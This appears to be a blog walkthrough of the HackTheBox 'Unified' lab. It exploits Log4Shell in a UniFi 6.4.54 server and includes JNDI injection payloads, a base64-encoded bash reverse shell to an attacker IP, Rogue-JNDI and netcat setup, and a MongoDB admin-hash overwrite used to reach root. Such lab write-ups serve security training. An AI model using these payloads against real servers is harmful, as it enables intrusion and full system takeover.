---
title: Welcome to ghouti blog garden
---

# walkthrough 

**Unified - HackTheBox Write-Up**

**1. Reconnaissance (Scanning):**

*   We begin by scanning the target machine (10.129.72.184) to identify open ports and services.  Using `rustscan` with aggressive options:

    ```bash
    rustscan -a 10.129.72.184 --ulimit 5500 -b 65535 -- -A
    ```

    *This scan uses `-A` to enable aggressive scan options, including version detection and script scanning.*  The `rustscan` output is:

    ```
    Open 10.129.72.184:22
    Open 10.129.72.184:8080
    Open 10.129.72.184:8843
    Open 10.129.72.184:8880
    Open 10.129.72.184:6789
    Open 10.129.72.184:8443
    ```

    *Further `nmap` enumeration from the `rustscan` output reveals:*

    ```
    PORT     STATE SERVICE         REASON  VERSION
    22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
    |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
    |   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
    6789/tcp open  ibm-db2-admin?  syn-ack
    8080/tcp open  http-proxy      syn-ack
    | fingerprint-strings:
    |   FourOhFourRequest:
    |     HTTP/1.1 404
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 431
    |     Date: Tue, 08 Nov 2022 13:55:06 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 404
    |     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404
    |     Found</h1></body></html>
    |   GetRequest, HTTPOptions:
    |     HTTP/1.1 302
    |     Location: http://localhost:8080/manage
    |     Content-Length: 0
    |     Date: Tue, 08 Nov 2022 13:55:05 GMT
    |     Connection: close
    |   RTSPRequest:
    |     HTTP/1.1 400
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 435
    |     Date: Tue, 08 Nov 2022 13:55:05 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400
    |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
    |     Request</h1></body></html>
    |   Socks5:
    |     HTTP/1.1 400
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 435
    |     Date: Tue, 08 Nov 2022 13:55:06 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400
    |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
    |_    Request</h1></body></html>
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-title: Did not follow redirect to https://10.129.72.184:8443/manage
    8443/tcp open  ssl/nagios-nsca syn-ack Nagios NSCA
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    | http-title: UniFi Network
    |_Requested resource was /manage/account/login?redirect=%2Fmanage
    | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
    | Subject Alternative Name: DNS:UniFi
    | Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2021-12-30T21:37:24
    | Not valid after:  2024-04-03T21:37:24
    | MD5:   e6be8c035e126827d1fe612ddc76a919
    | SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829
    | -----BEGIN CERTIFICATE-----
    | MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
    | UzERMA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQK
    | DA1VYmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkw
    | HhcNMjExMjMwMjEzNzI0WhcNMjQwNDAzMjEzNzI0WjBrMQswCQYDVQQGEwJVUzER
    | MA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQKDA1V
    | YmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkwggEi
    | MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDe9no5CdrT2i5FyDpaZ71+/1y6
    | 0WO356cC1Sbbufd1jRzXWom0dipfN7l+i/BI2KLyXPto+p3BVVwbORQe4OwPYnLu
    | CGAxZSOAtMieVAV0VpvbO35MJSWrSgf9qY2UAkSV6wMw40jcPI5MtLAS2c4tQYd2
    | bfYisnRZ0/ptCnBVTvJ2jzS7cJEgoZx7U1jMy6UkNuasWIGG3Xeyp2jJwuxrGbJb
    | aP7jjHHMvZ/TYh9uHq1rQQlDM4bHMRP+bPB2D6wuQIR3Dsd8ztdi0DpfP/QZp2tE
    | iavKrLBpUvAc96g2iEaF3b0piqkzUP31ijqc1RZxW2zaGMl2J9iCBm/eerh7AgMB
    | AAGjKTAnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBAGA1UdEQQJMAeCBVVuaUZpMA0G
    | CSqGSIb3DQEBCwUAA4IBAQAFvT2p6uA8sUGzz1WKbQjDPTeRM/ghhPCCqhWH3jF6
    | 9udW490Mv0mSZS4pBtcttnJ4D5IWnOeYoxoxw7ZAODhzvzcZ3w6RjnDy7WOB9e0/
    | 2ky4i+ABn2tfztNWTa2OBLM3bW1X15D3J7CHSGW1BOP2pA7ersOuP0/IV7Jo61Ok
    | FbxK5+8qn5ASRDZTeyCI//l5uYVjd19g7yNs850mv4hB8Y0I0PAzTLKVchv+A8VO
    | A2DeT8snk1C5L2Jw+WugNwdeyKqmmZRBKfo0KuQz0YG40zxx0SCAKnIXpUSrnlCU
    | VwtOH3PmERL30HjgR25E0RePOUepiX8psGR4CGV2U+dg
    |_-----END CERTIFICATE-----
    8843/tcp open  ssl/unknown     syn-ack
    | fingerprint-strings:
    |   GetRequest, HTTPOptions:
    |     HTTP/1.1 400
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 435
    |     Date: Tue, 08 Nov 2022 13:55:26 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400
    |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
    |     Request</h1></body></html>
    |   RTSPRequest:
    |     HTTP/1.1 400
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 435
    |     Date: Tue, 08 Nov 2022 13:55:28 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400
    |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
    |_    Request</h1></body></html>
    | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
    | Subject Alternative Name: DNS:UniFi
    | Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2021-12-30T21:37:24
    | Not valid after:  2024-04-03T21:37:24
    | MD5:   e6be8c035e126827d1fe612ddc76a919
    | SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829
    | -----BEGIN CERTIFICATE-----
    | MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
    | UzERMA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQK
    | DA1VYmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkw
    | HhcNMjExMjMwMjEzNzI0WhcNMjQwNDAzMjEzNzI0WjBrMQswCQYDVQQGEwJVUzER
    | MA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQKDA1V
    | YmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkwggEi
    | MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDe9no5CdrT2i5FyDpaZ71+/1y6
    | 0WO356cC1Sbbufd1jRzXWom0dipfN7l+i/BI2KLyXPto+p3BVVwbORQe4OwPYnLu
    | CGAxZSOAtMieVAV0VpvbO35MJSWrSgf9qY2UAkSV6wMw40jcPI5MtLAS2c4tQYd2
    | bfYisnRZ0/ptCnBVTvJ2jzS7cJEgoZx7U1jMy6UkNuasWIGG3Xeyp2jJwuxrGbJb
    | aP7jjHHMvZ/TYh9uHq1rQQlDM4bHMRP+bPB2D6wuQIR3Dsd8ztdi0DpfP/QZp2tE
    | iavKrLBpUvAc96g2iEaF3b0piqkzUP31ijqc1RZxW2zaGMl2J9iCBm/eerh7AgMB
    | AAGjKTAnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBAGA1UdEQQJMAeCBVVuaUZpMA0G
    | CSqGSIb3DQEBCwUAA4IBAQAFvT2p6uA8sUGzz1WKbQjDPTeRM/ghhPCCqhWH3jF6
    | 9udW490Mv0mSZS4pBtcttnJ4D5IWnOeYoxoxw7ZAODhzvzcZ3w6RjnDy7WOB9e0/
    | 2ky4i+ABn2tfztNWTa2OBLM3bW1X15D3J7CHSGW1BOP2pA7ersOuP0/IV7Jo61Ok
    | FbxK5+8qn5ASRDZTeyCI//l5uYVjd19g7yNs850mv4hB8Y0I0PAzTLKVchv+A8VO
    | A2DeT8snk1C5L2Jw+WugNwdeyKqmmZRBKfo0KuQz0YG40zxx0SCAKnIXpUSrnlCU
    | VwtOH3PmERL30HjgR25E0RePOUepiX8psGR4CGV2U+dg
    |_-----END CERTIFICATE-----
    8880/tcp open  cddbp-alt?      syn-ack
    ```

    *Key Findings from Scan:*

    *   Ports 22 (SSH), 8080 (HTTP Proxy), and 8443 (HTTPS) are open.
    *   Port 8080 redirects to 8443, where a UniFi Network application is running.

**Links for further reading:**

*   **Rustscan:** [https://github.com/RustScan/RustScan](https://github.com/RustScan/RustScan)
*   **Nmap:** [https://nmap.org/](https://nmap.org/)

**2. Application Enumeration:**

*   Access the UniFi application in a browser via HTTPS on port 8443: `https://10.129.72.184:8443/manage`
*   The web interface displays a login page. The version of software running on port 8443 is **6.4.54.**

**3. Vulnerability Research:**

*   Knowing the application and its version (UniFi 6.4.54), search for potential vulnerabilities. A Google search for "`UniFi 6.4.54 exploit`" reveals information about a Log4J vulnerability ([https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228))

**Links for further reading:**

*   **CVE-2021-44228:** [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
*   **UniFi Log4j exploit:** [https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
*   **Log4jExploitation:** [https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)

**4. Exploitation (Log4J - JNDI Injection):**

*   **Intercept the Login Request:** Use a web proxy (Burp Suite is recommended: [https://portswigger.net/burp](https://portswigger.net/burp)) to intercept the POST request to `/api/login`.
*   **Craft the JNDI Payload:** The "remember" parameter in the JSON POST data is the injection point. Modify the JSON data to include a JNDI lookup payload.

    *Example JSON Payload (replace with your tun0 IP):*

    ```json
    {"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.113/whatever}","strict":true}
    ```

    *   `jndi:ldap://...` :  This tells the Log4j library to use the Java Naming and Directory Interface (JNDI) to look up a resource via the Lightweight Directory Access Protocol (LDAP).

*   **Set Up `tcpdump` for Verification:** Open a terminal and start `tcpdump` to listen for LDAP (port 389) connections. This confirms the server attempts to connect to our malicious LDAP server.

    ```bash
    sudo tcpdump -i tun0 port 389
    ```

    *(Replace `tun0` with your network interface.)*

*   **Send the Payload and Verify:** Send the modified POST request.  The `tcpdump` output should show a connection attempt from the target to your machine on port 389, confirming the vulnerability.

*   **Code Execution Setup (Rogue JNDI):** To get code execution, we'll use Rogue JNDI to host a malicious LDAP server.

*   **Install Prerequisites (if not already installed):**

    ```bash
    sudo apt install openjdk-11-jdk -y
    sudo apt-get install maven -y
    ```

*   **Clone and Build Rogue-JNDI:**

    ```bash
    git clone https://github.com/veracode-research/rogue-jndi
    cd rogue-jndi
    mvn package
    cd ..
    ```

    *This builds the `RogueJndi-1.1.jar` file in the `target` directory.*

*   **Create a Reverse Shell Payload (Base64 Encoded):**  This is the command the target will execute.  We'll use a reverse shell to connect back to our machine.

    ```bash
    echo 'bash -c bash -i >&/dev/tcp/10.10.14.113/1337 0>&1' | base64
    ```

    *(Replace `10.10.14.113` with your tun0 IP and `1337` with your chosen listening port.)  Save the base64 encoded output.*

*   **Start Rogue-JNDI with the Payload:**

    ```bash
    java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YOUR_BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" --hostname "10.10.14.113"
    ```

    *(Replace `YOUR_BASE64_PAYLOAD` with the actual base64 you just generated, and `10.10.14.113` with your tun0 IP.)*

*   **Start a Netcat Listener:**  In another terminal, start a listener to catch the reverse shell.

    ```bash
    sudo nc -nlvp 1337
    ```

    *(Use the same port you specified in your reverse shell payload. Sudo may be required)*

*   **Modify and Send Final Exploit in Burp Repeater:** Update the "remember" parameter with a new JNDI payload pointing to the Rogue JNDI server.  Use a pre-configured exploit path (e.g., `o=tomcat`).

    *Final JSON Payload:*

    ```json
    {"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.113:1389/o=tomcat}","strict":true}
    ```

    *(Replace `10.10.14.113` with your tun0 IP.)*

    Send the request.  If everything is configured correctly, you should receive a shell on your Netcat listener.

**5. Post-Exploitation (Privilege Escalation):**

*   **Stabilize/Upgrade Shell (Optional but Recommended):**

    ```bash
    script /dev/null -c bash
    Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    ```

*   **Enumerate (MongoDB):** Check if MongoDB is running.

    ```bash
    ps aux | grep mongo
    ```

    *From the output, we confirm that MongoDB is running on the target system on port 27117.*

    ```
    unifi         67  0.4  4.1 1103748 85336 ?       Sl   13:53   0:32 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
    unifi       3865  0.0  0.0  11468   968 pts/0    S+   16:10   0:00 grep mongo
    ```

*   **Connect to MongoDB:**

    ```bash
    mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
    ```

    *We are looking for database of ace*

*   **Update credentials to allow login to the webUI**
        *Remember the username is case sensitive "administrator"*

    ```bash
    mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$lAdCdwuL/CmuRziS$VYgRwhZ4ku8YYkw0gkkYYZ6l8L4o6v3OLF6u4w9YukORsw2OtjyW6UQEBcGnT5ub79nrXEgpPbOD75H5lBcyx."}})'
    ```

*   **Login to UniFi Web Interface:** Use `administrator:Password1234` login to the UniFi administrative panel.

*   **Get root credentials through UniFi Web Interface:**
    *   Navigate to settings -> site
    *   Find the SSH Authentication setting.
    *   Password should be *NotACrackablePassword4U2022*

**6. Escalate to Root:**

*   **SSH to Target as Root:**

    ```bash
    ssh root@10.129.72.184
    ```

    *(Use the password found in the UniFi interface.)*

*   **Get User and Root Flags:**

    ```bash
    cat /home/michael/user.txt
    cat /root/root.txt
    ```

